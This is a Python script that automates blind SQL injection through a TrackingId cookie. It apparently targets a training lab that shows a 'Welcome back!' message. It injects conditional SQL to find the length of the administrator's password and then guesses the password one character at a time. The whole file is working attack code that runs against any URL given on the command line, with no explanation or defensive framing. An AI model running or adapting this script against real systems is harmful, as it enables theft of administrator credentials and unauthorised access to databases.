import requests
import argparse
import string

def par():
    parser = argparse.ArgumentParser(description='Blind SQL injection with conditional responses')
    parser.add_argument('--url', type=str, required=True, help='URL of the target')
    return parser.parse_args()

def req(url):
    r = requests.get(url)
    cookie = r.cookies.get_dict()
    trackingId = None
    for name, value in cookie.items():
        if 'TrackingId' in name:
            trackingId = value
            break
    if trackingId is not None:
        print(f"[+] Found TrackingId: {trackingId}")
    else:
        print("TrackingId not found in cookies")
    return trackingId

def pass_length(url, trackingId):
    length = 0
    while True:
        modified_trackid = trackingId + f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>{length}--"
        cookies = {'TrackingId': modified_trackid}
        r = requests.get(url, cookies=cookies)
        if 'Welcome back!' not in r.text:
            break
        length += 1
    if length != 0 and length < 32:
        print(f'[+] Password length: {length}')
    return int(length)


def sqli(url, trackingId, password_length):
    password = ''
    for position in range(password_length):
        found_char = False
        for char in string.ascii_letters + string.digits:
            modified_trackid = trackingId + f"' AND (SELECT SUBSTRING(password,{position+1},1) FROM users WHERE username='administrator')='{char}'--"
            cookies = {'TrackingId': modified_trackid}
            r = requests.get(url, cookies=cookies)
            if 'Welcome back!' in r.text:
                password += char
                found_char = True
                print(f'\r[+] Password: {password}', end='', flush=True)  
                break  
        if not found_char:
            break

if __name__ == '__main__':
    args = par()
    trackingId = req(args.url)
    if trackingId:
        password_length = pass_length(args.url, trackingId)
        if password_length:
            sqli(args.url, trackingId, password_length)
